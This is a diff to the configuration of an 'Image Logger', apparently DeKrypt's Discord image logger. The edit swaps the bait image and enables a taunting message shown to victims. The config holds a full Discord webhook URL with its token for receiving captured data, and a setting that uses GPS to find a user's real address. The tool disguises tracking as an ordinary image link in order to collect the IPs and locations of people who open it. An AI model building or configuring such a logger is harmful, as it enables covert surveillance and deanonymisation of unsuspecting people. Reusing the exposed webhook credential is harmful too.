@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1353413952452952127/jvH2LWTWY-EGrMPSVYjvhJVy2TedQ0y_iQTNQsBah_Yg0nhja-y5d86cvawQYtHH0I16",
-    "image": "https://cdn.discordapp.com/attachments/1350548251580960770/1351966353376018565/IMG_8775.jpg?ex=67dc4c48&is=67dafac8&hm=bb31e2b7cff9a931c431d1915fdf7aed2675d4ce3c0457d803d96d2b9acb143a&", # You can also have a custom image by using a URL argument
+    "image": "https://cdn.discordapp.com/attachments/1350548251580960770/1387494830233485392/image.png?ex=6873f641&is=6872a4c1&hm=b23fa2118ef55d5e82ee25da8e037d6fdb15a9c3839d133d06d13c82c87ec304&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -27,8 +27,8 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "You a really dump your Nico Hacking Team", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
